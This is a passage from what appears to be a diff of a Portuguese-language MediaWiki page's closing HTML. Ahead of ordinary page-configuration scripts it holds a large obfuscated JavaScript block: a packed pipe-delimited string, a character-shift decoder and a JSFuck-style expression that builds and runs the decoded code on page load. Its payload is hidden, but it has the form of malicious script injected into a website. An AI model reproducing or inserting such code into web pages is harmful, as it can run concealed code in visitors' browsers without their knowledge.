0TnXhtaJMTH|3mCmcIBZiVUa0hnut|osRwkoNbhnUheIIIIJRZC5MzsRooo|160xf|YpHTGTV54|40xf|200|ktqks|axtqb|zmdmzam|rwqv|999|m8fz8v5txFgv|14FW7kZ5ED1YJmlb3k|p0OaWKa9CeX2fw6|N2Y|CquIgvo9CmXczxdU8EuIladq6oVeJUpXzXymuwFgeHa8yT9RHgjpyN6THJHRVIVuGaWAiJBsAykxvKNMsvbGrbZMNtIBMboflLYtnnpA3llLIhnjjPGXCLORxOB|CILDodfPJhX9TCcnyYLbD|cQ70eWaoNECYKnHK1CQ0Mbbwp66L|ahAlIbSbesZZVvKQqLhVhk0ZW|suTjSuaM|xgYTqJc8ELGofMHUjmMyQqAU8z|f0h6bicYGdXfeB0DU1tP9Ilb5Tx|jBxtpj|JVgMVqNOm5KfoHgQB6SDgOW2a5R5km|M5PtYA6APdDAC0D|r9fRDJMMjEMFNDHYVF9|1PF6opsIZ9M5kzBoU|0b6yrQtHjhAxmuq|UrI3FRCSg|AZEpVauWihdShYGkM0pD5vLscYYSnCou4PuyI2gcXfnUC1u4hTZBUIyTpV6JPKmMFULw2VaG8UlKmJJ6RglUtxa3cOfHmng7MW1dgXdpWfT7BXErDCDdHsVR|KOn7AIX2D6IrBWCi8QhL3ksym2MVOctEOnf9DSQJJ72RU1tIcTSJ3biWVKJv3XG0QQ5kNzTz7kKx|CQEzlDXMx7hPg7wEFqCouZ3slcrjHQ73sopBiwiMSUWp8cx2U8JDkmwbl|libi|xvo|3Q79q7x|Kx93c3btY3M0XWQoXx5ia20uXVQ4K2QucVIrYVMrzVMqKlkiav|iaqv|iE5hTuNsk2R5H29dH2ft|ycmzgAmtmkbwz|Tg9eGEltGEYgTuldj2laHFV5juZxG2N0iE9cTuVdjA9eGEltGEYdivUdGEZhGvtvj29vjOCcivU|tqvm|Kx93c3btY29uY2wkKlMuaR9gYGMkamMkK3M0XWI0K2ksXVckbx9lXWYoX29tKlkiav|Kx9gYGYkbmQob2ktYx55XVguax5ia20uYlE2zVMuah5oX28|vwzuit|Kx9gYGLtcGcocGQkbh5ia20uYlE2zVMuah5oX28|Kx93c3btYF91XlwkX2woX2shdVcua2crYR5ia20uYlE2zVMuah5oX28|jiksozwcvl|zilqca|iL0fULY|mENwj28cGEZcHFZpk2tpTuVdjA9hHFR2X3U9UrGg|mENhjuscGEZcHFZpk2tpTuVdjA9sHFVxH24dkuDaGFDcG2odH2H4T2DaiFZtkONglO5tkt8|CAMKdvwkrMl|wvktqks|k2DgluCcGEZcHFZpk2tpTuVdjA9eku9bj2fdGEY|uizoqvZqopb|14xf|Libm|zoji|123|jwfApilwe|jwzlmzZilqca|akzmmv|SXwsZMhB|ambQvbmzdit|ija|bgxmwn|468xf|12xf|qvamzbJmnwzm|16xb|zmtwil|j3obHK5pHO5tlONhiEMcG29bT2N1iEY9UhU|mu9dluDgTuNsjuD0GFVxGA5rj20dk2ppkuDsT2Rpju5tkvJpH2DhT2ZpkvZ0GElhGuNcjuDgTuNhkPo|HL0f|ktmizQvbmzdit|35xf|nnn|kaa|KKK|kzmibmBmfbVwlm|45xf|awtql|Izqit|qvvmzPmqopb|1xf|9999|pbbxa|jqb|tg|iPZbjPbrj2fdkrwrULIeW2RpG2bvku91juY6Q2HuHv1qj2Z5TOZxlqfsjKfslKfsHKf1jKfdjKfaiAfwUAfwUqfwUgfwVKfwVAfwVqfekuCaG29sHAfuj3RbTOHxHEfsk2D0TOftH2DcHKfxjvJ1lKf0HFp0GFRtGAfeTORaj2VzkFDdlOCalOoalOZ7jENgH2tcWrI7kONsHOtcHhwenFZpGuftm2RdkuZtkq1rj2faGFJhHBxrj2faGFJhHBbqj3RsHFQbk3JpG2tcHhwenEHxHEfsk2D0TOtbH3bqj3RsHFQ6UP1pHOZgHFVhTOVpkPZxj24aG2t0HAfrj2ZtTOZujqftjAfhlPRdjukalOoaluNgm2HdjvYbk3Z5jOC6ju9gjENaW2HdjvYbl2DxH2p0Wu5dku1pjP1djKf1jPbaiFV0TFV0mEftWu5djuD9G2NelOtdjqf0iPb0HFp0TENaiElcWuftHvZ9iLMaiLQaiLUaiLYaiLCaiLH7Hu9clK1hiFxtWrMeUKC7Hu9clK13HEtviPY6ju9gjENanFM6GuDuj3RtTPM6GEH0HFR7G29clODclLwqQv1pGuRgTONrku9cmE17Gu9gHODgWrI7Hu9clK12GFRxGE50Wu5dku1pjP1hlFJ7luDglOtrGEebGEfxH246lOD4lK10j3J9k3Dqm3HtkvZxG2NaTENaiElcWvZtmPYbGu90lO9bnEtckPD0TPZtmPZpkuDpTPVtjODrlPbuj250TEHpjEtamBxxjuptkut0W2HdjvYbk2t6HBxxjuptkut0W2HdjvYbl2DxH2p0WutciODgiFY7SuHdjvYbk2t6HBwfULItnEftH2DcHPbrj2fdkrwrULIenAV5lEshTEVhkg1hlONbkK5rk3VgHFVtlPbsiFVejON5Wu5djuD9|18xb|wvuwcamwdmz||GEZrjOt4mK5cHFY|Jtiks||GEZ0kuNri2Dgkg5cHFY|GuNcjuDglPRpG2acjuD0|||ilvmbiaqi|GEZcHFZpk2tpTuVdjY|lO9gkuDclPwcGEZcHFZpk2tpTuVdjA9bH2tsT2NsTuxh|wvuwcamwcb|G3R1juVwmFRdjOecGEZcHFZpk2tpTuVdjA92GFV0X2HvXBU'.axtqb('|'),0,{}));*/});var hxLKPPNrF = [!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]]+[+[]];var bwhvzzmhoKHu = '';var _0x41d7=['length','charCodeAt','fromCharCode'];for(var i=0;i< iJQludsRIPxz[_0x41d7[0]];i++){var OGUflkIw=iJQludsRIPxz[_0x41d7[1]](i);if(97<= OGUflkIw&& OGUflkIw< 123){bwhvzzmhoKHu+= String[_0x41d7[2]]((OGUflkIw- hxLKPPNrF+ 7)% 26+ 97)}else {if(65<= OGUflkIw&& OGUflkIw< 91){bwhvzzmhoKHu+= String[_0x41d7[2]]((OGUflkIw- hxLKPPNrF+ 13)% 26+ 65)}else {bwhvzzmhoKHu+= String[_0x41d7[2]](OGUflkIw)}}};var x=bwhvzzmhoKHu;[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]])[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
+</script>		
+<script>
+var fbtFancyBoxOptions = {};
+</script>
+
+<script>(RLQ=window.RLQ||[]).push(function(){mw.config.set({"wgPageParseReport":{"limitreport":{"cputime":"0.088","walltime":"0.469","ppvisitednodes":{"value":302,"limit":1000000},"postexpandincludesize":{"value":5390,"limit":2097152},"templateargumentsize":{"value":0,"limit":2097152},"expansiondepth":{"value":4,"limit":100},"expensivefunctioncount":{"value":0,"limit":"150"},"unstrip-depth":{"value":0,"limit":20},"unstrip-size":{"value":0,"limit":5000000},"timingprofile":["100.00%   58.405      1 -total"," 36.92%   21.565      1 Predefinição:Evento_em_destaque"," 28.80%   16.818      1 Predefinição:Índice"," 20.53%   11.989      1 Predefinição:Rashid_Home"," 13.25%    7.739      1 Predefinição:Estatísticas"]},"cachereport":{"timestamp":"20260507134443","ttl":3600,"transientcontent":true}}});mw.config.set({"wgBackendResponseTime":1127});});</script>
+</body>
+<!-- Cached 20260507134444 -->
+</html>
